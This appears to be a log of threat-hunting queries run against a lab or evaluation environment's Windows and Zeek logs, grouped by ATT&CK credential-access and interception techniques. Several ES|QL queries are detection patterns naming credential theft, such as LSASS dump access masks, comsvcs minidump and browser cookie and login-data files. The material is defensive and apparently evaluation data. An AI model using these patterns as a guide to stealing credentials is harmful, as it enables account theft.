| q-70391a483c | triage T1212 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLr9"} | None |  |
| q-37f1fbe4bc | triage T1212 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-d029ee25d3 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy1B5lB"} | None |  |
| q-6e70e852b8 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy4FbJD"} | None |  |
| q-619937dee0 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeByBux8WuD"} | ERROR |  |
| q-ef9e9cb3b1 | triage T1212 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-b585429084 | triage T1212 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR8i"} | None |  |
| q-742522c034 | triage T1539 step 1 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None | F23 |
| q-52e398c254 | triage T1539 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBur1GH0"} | None | F23 |
| q-cbe869bda9 | triage T1539 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND (TO_LOWER(win.TargetImage) LIKE \"*edge*\" OR TO_LOWER(win.TargetImage) LIKE \"*chrome*\" OR TO_LOWER(win.TargetImage) LIKE \"*firefox*\" OR TO_LOWER(win.TargetI… | 30 |  |
| q-415f36c3ca | triage T1539 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*cookies*\" OR TO_LOWER(win.TargetFilename) LIKE \"*login data*\" OR TO_LOWER(win.TargetFilename) LIKE \"*web data*\" OR TO_… | 1 |  |
| q-151dbe56d5 | triage T1539 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| STATS c = COUNT(*) BY host.name, win.ScriptBlockId \| SORT c DESC \| LIMIT 20"} | 20 |  |
| q-0197b941fa | triage T1539 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*cookie*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*session*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*login data*\"… | 20 |  |
| q-86ee90b4f5 | triage T1539 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" \| KEEP @timestamp, win.ScriptBlockText, _id, _index \| LIMIT 20"} | 20 |  |
| q-fc27c6db8e | triage T1539 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByDVdnF"} | ERROR |  |
| q-621054d0e5 | triage T1539 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*invoke-beach*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*seaduke*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*invoke-… | 3 |  |
| q-ef699966e7 | triage T1539 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None | F23 |
| q-364d043c5a | triage T1539 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByDVdnF"} | ERROR |  |
| q-441b408874 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBur1GH0"} | None |  |
| q-9e56fb9a50 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBur1GH0"} | None |  |
| q-d25ee4701b | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-7775492675 | triage T1539 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-0c498d693a | triage T1539 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-1956819d37 | triage T1552 step 1 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNRGHl"} | None | F24 |
| q-53ed52daaa | triage T1552 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE TO_LOWER(process.executable) LIKE \"*accesschk*\" OR TO_LOWER(process.command_line) LIKE \"*accesschk*\" OR TO_LOWER(win.TargetFilename) LIKE \"*passwordsdb*\" \| KEEP @timestamp, host.n… | 22 |  |
| q-f1a9799dd1 | triage T1552 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.executable) LIKE \"*sysinternals*\" OR TO_LOWER(process.parent.executable) LIKE \"*sysinternals*\" OR TO_LOWER(process.executable) LIKE \"*sdele… | 16 | F24, F25 |
| q-2b1dd173e5 | triage T1552 step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _index \| SORT @timestamp"} | 414 |  |
| q-6021034e00 | triage T1552 step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByXfnRy"} | None | F24 |
| q-9a8b0adc29 | triage T1552 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE host.name == \"nashua.dmevals.local\" AND event.code IN (\"11\",\"1\",\"23\") AND (TO_LOWER(win.TargetFilename) LIKE \"*zip*\" OR TO_LOWER(win.TargetFilename) LIKE \"*rar*\" OR TO_LOWER(… | 11 | F25 |
| q-5458eeb1a7 | triage T1552 step 4 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"5145\") AND (TO_LOWER(win.ObjectName) LIKE \"*passw*\" OR TO_LOWER(win.ObjectName) LIKE \"*cred*\" OR TO_LOWER(win.ObjectName) LIKE \"*unattend*\" OR… | 0 |  |
| q-f80385ae36 | triage T1552 step 4 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None | F25, F27 |
| q-3fb08cacf6 | triage T1552 step 5 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"smb_files\" \| KEEP @timestamp, observer.name, source.ip, destination.ip, zeek.filename, zeek.path, zeek.action, zeek.size, _id, _index \| SORT @timestamp"} | 12 |  |
| q-137271127e | triage T1552 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*gpttmpl*\" OR TO_LOWER(win.TargetFilename) LIKE \"*gpt.ini*\" OR TO_LOWER(win.TargetFilename) LIKE \"*sysvol*\" OR TO_LOWER… | ERROR |  |
| q-b2a6091aee | triage T1552 step 6 | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8M"} | None | F29 |
| q-3a2b277358 | triage T1552 step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(win.TargetFilename) LIKE \"*gpttmpl*\" OR TO_LOWER(win.TargetFilename) LIKE \"*gpt.ini*\" OR TO_LOWER(win.TargetFilename) LIKE \"*sysvol*\" OR TO_LOWER… | 27 | F28, F29 |
| q-3c6a37579d | triage T1552 step 7 | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeByNiUGh"} | None | F29 |
| q-8e3a73edf0 | triage T1552 step 7 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNRGHW"} | None | F24 |
| q-d6b7ffe912 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByXfnRy"} | None |  |
| q-cb780fca69 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNRGHW"} | None |  |
| q-a116b691b4 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNRGHl"} | None |  |
| q-e69f4fd338 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoSVqPo"} | None |  |
| q-8eb2d4740f | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoQTo3z"} | None |  |
| q-fe8152674c | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4z4i"} | None |  |
| q-f7355b06f6 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-147157a51b | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4j7h"} | None |  |
| q-d7b52ed4ca | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBow1qSj"} | None |  |
| q-8f3ad0d442 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBnts2nD"} | ERROR |  |
| q-62e289af4d | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoKOGL_"} | None |  |
| q-2a02fc92f8 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnfdUsq"} | None |  |
| q-7099be7dd8 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi85CSh"} | None |  |
| q-12fda23a7f | triage T1552 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-1319e689ad | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoqv86o"} | None |  |
| q-32c4c8ed81 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4j7n"} | None |  |
| q-1ab8b930f7 | triage T1552 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8M"} | None |  |
| q-942ebbea51 | triage T1552 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeByNiUGh"} | None |  |
| q-13ca1419b9 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoTWpZy"} | None |  |
| q-048c709ae1 | triage T1552 step 9 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBnts2nD"} | ERROR |  |
| q-18a07e2b11 | triage T1552 step 10 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"nashua.dmevals.local\" AND TO_LOWER(process.executable) LIKE \"*sdelete*\" \| KEEP @timestamp, process.executable, process.command_line, user.name,… | 3 |  |
| q-4d48c28f45 | triage T1552 step 11 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnts2nD"} | None | F25 |
| q-50f06186ae | triage T1555 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass.exe\" AND win.GrantedAccess IN (\"0x1fffff\",\"0x1f3fff\",\"0x101001\",\"0x1000000\",\"0x3000\",\"0x1400\") \| KEEP @time… | 33 |  |
| q-4fe47b3ed5 | triage T1555 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass.exe\" \| STATS c = COUNT(*) BY win.SourceImage, win.GrantedAccess \| SORT c DESC"} | 15 |  |
| q-0802c5cbe5 | triage T1555 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None | F30 |
| q-ebec04b7cc | triage T1555 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None | F30 |
| q-42ed850df0 | triage T1555 step 2 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-420450a1e6 | triage T1555 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND user.name == \"pbeesly\" \| KEEP @timestamp, host.name, user.name, win.Path, win.ScriptBlockText, _id, _index \| SORT @timestamp ASC"} | 157 | F31 |
| q-1ea0f1d261 | triage T1555 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*lsass*\" OR TO_LOWER(process.command_line) LIKE \"*minidump*\" OR TO_LOWER(process.command_line) LIKE \"*comsvcs*\" OR TO_… | 1 |  |
| q-45710f6d81 | triage T1555 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND user.name == \"pbeesly\" AND @timestamp > \"2020-05-02T03:01:51.000Z\" \| KEEP @timestamp, host.name, user.name, win.Path, win.ScriptBlockText, _id, _index… | 117 | F33 |
| q-cbfb196828 | triage T1555 step 4 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4688\" AND (user.name == \"pbeesly\" OR TO_LOWER(win.SubjectUserName) == \"pbeesly\") \| KEEP @timestamp, host.name, user.name, win.NewProcessName, win.CommandLine, win… | 144 | F30 |
| q-fd7fcb956b | triage T1555 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRarqU"} | None |  |
| q-92f3f6dcc7 | triage T1555 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"nashua.dmevals.local\" AND @timestamp >= \"2020-05-02T03:08:00.000Z\" AND @timestamp <= \"2020-05-02T03:12:00.000Z\" \| KEEP @timestamp, hos… | 2 | F30 |
| q-8a49c5ada4 | triage T1555 step 6 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" AND @timestamp >= \"2020-05-02T03:04:50.000Z\" AND @timestamp <= \"2020-05-02T03:05:20.000Z\" \| KEEP @timestamp, h… | 5 |  |
| q-e6adb155a4 | triage T1555 step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*login data*\" OR TO_LOWER(file.path) LIKE \"*logins.json*\" OR TO_LOWER(file.path) LIKE \"*key3.db*\" OR TO_LOWER(file.path) LIKE \"… | 2 | F31 |
| q-61727c000e | triage T1555 step 7 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None | F31, F33 |
| q-efb478e3b5 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-252cdad97c | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-1eb12757de | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-9bbcdf475f | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-b14d70840d | triage T1555 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByCVtlI"} | None |  |
| q-3db62ef70f | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy0A4uc"} | None |  |
| q-f63a110fa1 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy3EfF6"} | None |  |
| q-3ea4ea7d89 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-75e28ac221 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-b8fcdd2b02 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByXfnRy"} | None |  |
| q-4783a9325d | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBudppHD"} | None |  |
| q-da6e2bf02f | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuitni7"} | None |  |
| q-06998c6ac5 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1A"} | None |  |
| q-7818d0747e | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-5e67a5cd3f | triage T1555 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-de023c69bb | triage T1556 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" \| STATS c = COUNT(*) BY win.SourceImage, win.GrantedAccess, host.name \| SORT c ASC"} | 18 |  |
| q-359542dc44 | triage T1556 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*lsass*\" OR TO_LOWER(process.command_line) LIKE \"*sam*\" OR TO_LOWER(process.command_line) LIKE \"*credential*\" OR TO_LO… | 2 |  |
| q-6389c67233 | triage T1556 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" AND (win.SourceImage LIKE \"*wsmprovhost*\" OR win.SourceImage LIKE \"*PowerShell.exe\" OR win.SourceImage LIKE \"*csr… | 6 | F34 |
| q-0eb449a32b | triage T1556 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBjA9g2o"} | None | F34 |
| q-8a6dbda72f | triage T1556 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*invoke-expres… | 4 | F34, F37, F40 |
| q-f15523822c | triage T1556 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.executable LIKE \"*wsmprovhost*\" OR process.parent.executable LIKE \"*wsmprovhost*\" OR process.executable LIKE \"*dsregcmd*\" OR process.command_line L… | 7 | F35, F38, F39 |
| q-fcee4c914c | triage T1556 step 4 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWlPk"} | None |  |
| q-29f5cf4a09 | triage T1556 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None | F35 |
| q-9d45570d88 | triage T1556 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND win.ProcessId == \"2976\" \| KEEP @timestamp, host.name, user.name, process.executable, process.command_line, process.parent.executable, _id, _index"} | 1 | F34 |
| q-207d18d8d7 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-d11a2e4617 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-b8f0f685c0 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-1c86251ee1 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBorwtwa"} | None |  |
| q-daef45c5dd | triage T1556 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWlPk"} | None |  |
| q-eb9f37adf8 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWlPk"} | None |  |
| q-7fdad3af66 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWUg0"} | None |  |
| q-d76627b879 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBjA9g2o"} | None |  |
| q-f500b6f618 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-40e7e78538 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-a95ca0b758 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-9db64d1e3a | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBo05D7L"} | None |  |
| q-fc2c60bbc1 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoty_Kk"} | None |  |
| q-d1585482cb | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoOSnoR"} | None |  |
| q-4fe2370055 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWUg0"} | None |  |
| q-75820f5ff9 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30BSA"} | None |  |
| q-82ce909036 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30BSA"} | None |  |
| q-2bbea0de25 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoGKqgM"} | None |  |
| q-35d39b8d5c | triage T1556 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWlPk"} | None |  |
| q-3507cd29ee | triage T1557 step 1 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" AND (zeek.resp_l2_addr == \"12:34:56:78:9a:bc\" OR zeek.orig_l2_addr == \"fc:bd:67:e1:a9:c1\") \| KEEP @timestamp, zeek.id_orig_h, zeek.id_resp_h, zeek.id_resp_p, zeek.ser… | 30 | F43 |
| q-bf74fff4e2 | triage T1557 step 1 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" AND zeek.service LIKE \"*smb*\" \| KEEP @timestamp, zeek.id_orig_h, zeek.id_resp_h, zeek.id_resp_p, zeek.service, zeek.orig_l2_addr, zeek.resp_l2_addr, zeek.conn_state, _i… | 16 | F43 |
| q-f697cc3590 | triage T1557 step 2 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action IN (\"notice\",\"weird\",\"smb_files\",\"smb_mapping\") \| KEEP @timestamp, event.action, zeek.note, zeek.msg, zeek.id_orig_h, zeek.id_resp_h, zeek.filename, zeek.path, zeek.name, zee… | 37 | F42, F43 |
| q-e858efdc78 | triage T1557 step 2 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE event.code == \"7045\" OR event.code == \"7040\" \| KEEP @timestamp, host.name, event.code, win.ServiceName, win.ImagePath, win.ServiceType, win.StartType, win.AccountName, _id, _index \|… | 9 |  |
| q-6d7d10a8ac | triage T1557 step 3 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4697\" \| KEEP @timestamp, host.name, user.name, win.ServiceName, win.ServiceFileName, win.ServiceAccount, _id, _index \| LIMIT 25"} | 23 |  |
| q-180859f170 | triage T1557 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"3\" AND (destination.port == 445 OR destination.port == 137 OR destination.port == 138 OR destination.port == 139) \| KEEP @timestamp, host.name, process.executable, sour… | 40 | F42, F44 |
| q-a3933eb967 | triage T1557 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*invoke-*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*psexec*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*smb*\" OR TO_… | 15 |  |
| q-ffb7c32d8d | triage T1557 step 4 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"5145\" OR event.code == \"5140\" \| KEEP @timestamp, host.name, user.name, win.ShareName, win.ShareLocalPath, win.RelativeTargetName, win.IpAddress, win.SubjectUserName… | 30 |  |
| q-eda2109177 | triage T1557 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4624\" \| STATS c = COUNT(*) BY win.LogonType, win.AuthenticationPackageName, win.TargetUserName \| SORT c DESC \| LIMIT 30"} | 18 |  |
| q-b5c170fe89 | triage T1557 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*javamtsup*\" OR TO_LOWER(process.command_line) LIKE \"*python*\" OR TO_LOWER(process.executable) LIKE \"*python*\") \| KEE… | 10 | F41 |
| q-210fb6a04a | triage T1557 step 6 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4624\" AND win.AuthenticationPackageName == \"NTLM\" \| KEEP @timestamp, host.name, user.name, win.TargetUserName, win.LogonType, win.IpAddress, win.Workstation, win.Lo… | 1 | F41 |
| q-320c7a3712 | triage T1557 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBufr2mI"} | None |  |
| q-e972dd531c | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz3z5O"} | None |  |
| q-c94189ce4d | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh9E"} | None |  |
| q-750b717216 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8L"} | None |  |
| q-66049a5266 | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi63kXG"} | None |  |
| q-25878c04f2 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR_H"} | None |  |
